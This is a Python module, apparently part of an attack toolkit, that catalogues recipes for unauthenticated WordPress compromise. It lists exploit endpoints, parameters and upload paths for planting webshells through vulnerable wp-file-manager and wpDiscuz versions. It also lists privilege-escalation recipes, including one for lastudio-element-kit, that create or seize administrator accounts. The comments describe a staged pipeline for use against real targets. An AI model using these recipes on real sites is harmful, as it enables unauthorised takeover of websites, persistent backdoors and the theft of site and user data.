"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles", "wmu_nonce": ""},
        "field": "wmu_files[0]",
        "upload_path": "/wp-content/uploads/{filename}",
        "source": "registry",
        "note": "wmuUploadFiles trusts forged mime-type; drops PHP into uploads/.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]


# ── Track B: privilege-escalation recipes (unauth → admin account) ────────────
# These don't upload a shell directly; they grant an ADMIN account, which the
# authenticated-webshell stage (wp_authshell) then uses to plant a shell.
# Privilege-escalation recipes for Track B. wp_privesc.acquire_admin dispatches
# on "kind"; each kind reads a fixed set of fields — confirm every value against
# the CVE's PoC before running against a real target. Shapes:
#
#   register-role   : {endpoint, action, user_field, email_field, pass_field,
#                      role_param, role_value}  → creates an admin with our creds.
#   options-update  : {endpoint, option_name_param, option_value_param,
#                      set_options:{users_can_register:"1", default_role:"administrator"},
#                      register_endpoint, user_field, email_field, [pass_field]}
#                      → forces open registration + admin default role, registers.
#   auth-bypass     : {endpoint, method:"GET"|"POST", params}  → leaves the
#                      session authenticated as admin (returns {"authed": True}).
#   password-reset  : {endpoint, target_user, user_param, pass_param, params}
#                      → resets a known admin's password to one we choose.
PRIVESC_RECIPES = [
    {
        "plugin": "lastudio-element-kit",
        "cve": "CVE-2026-0920",
        "affected": "<=1.5.6.3",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        # ajax_register_handle is hooked to a nopriv AJAX action; the exact
        # action string should be confirmed against the plugin source / PoC.
        "action": "lastudio_register",
        "user_field": "user_login",
        "email_field": "email",
        "pass_field": "password",
        "role_param": "lakit_bkrole",
        "role_value": "administrator",
        "source": "registry",
        "note": "ajax_register_handle honours lakit_bkrole → unauth admin registration.",
    },
]


def find_privesc(plugin_slug):
    return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]
